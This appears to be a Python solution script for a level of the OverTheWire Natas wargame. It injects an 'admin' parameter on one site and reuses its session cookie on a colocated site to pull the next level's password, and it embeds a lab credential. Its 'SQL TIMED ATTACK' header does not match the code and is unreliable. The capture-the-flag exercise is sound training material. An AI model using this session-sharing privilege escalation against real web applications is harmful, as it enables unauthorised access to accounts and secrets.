#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas22'
password='IFekPyrQXftziDEsUr3x21sYuahypdgJ'

url = 'http://%s-experimenter.natas.labs.overthewire.org/' %username
url2 = 'http://%s.natas.labs.overthewire.org/' %username

path = '?debug=true'
session = requests.session()


response = session.post(url + path, auth=(username, password), data={'align':'left', 'bgcolor':'black', 'submit':'Update', 'admin':'1'})

content = response.text
print content
sid = session.cookies['PHPSESSID']
print "="*80
response2= session.post(url2, auth=(username, password), data={'user':'admin'}, cookies={'PHPSESSID':sid})
content2 = response2.text
print content2
print "="*80
print re.findall('Password: (.*)</pre>', content2)[0]

#This one was pretty simple. We just had to set the value of 'admin' = 1. That was easily done with the exeperimenter website.
#The other confusing part was that as both the websites were colocated, we needed to use the same session ID for both the website. Once we passed the session ID from first request to the second one, it worked.